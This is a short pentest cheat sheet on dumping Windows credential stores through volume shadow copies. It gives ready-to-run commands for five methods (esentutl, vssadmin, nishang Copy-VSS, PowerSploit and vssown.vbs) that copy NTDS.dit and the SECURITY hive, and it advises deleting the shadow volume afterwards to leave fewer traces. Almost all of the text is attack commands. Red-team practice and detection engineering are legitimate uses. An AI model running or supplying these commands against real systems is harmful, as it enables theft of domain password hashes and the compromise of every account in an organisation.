# Shadow Copy

The same can be done with SAM and LSA, also don't forget to delete the shadow volume.

## Esentutl method

Need admin privilege on the computer

```
esentutl.exe /y /vss C:\Windows\NTDS\NTDS.dit /d C:\ntds.dit.bak
esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d c:\security
```

## Vssadmin method

Need admin privilege on the computer

```
vssadmin create shadow /for=C: 
copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\ntds.dit.save
copy $ShadowCopyName\Windows\System32\config\SECURITY C:\SECURITY.save 
vssadmin delete shadows /shadow=$ShadowCopyId 
```

## Copy-VSS Method

Need admin privilege on the computer

https://github.com/samratashok/nishang

```
Import-Module .\nishang.psm1
Copy-VSS -DestinationDir C:\
```

## Powersploit Method

https://github.com/PowerShellMafia/PowerSploit

```
Import-Module .\PowerSploit.psm1
New-VolumeShadowCopy -Volume C:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SECURITY C:\SECURITY
```

## Vssown method

Execute vba script with admin privilege on the computer

https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs

```
cscript vssown.vbs /start
cscript vssown.vbs /create c
cscript vssown.vbs /list
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SECURITY C:\SECURITY
cscript vssown.vbs /delete 
```

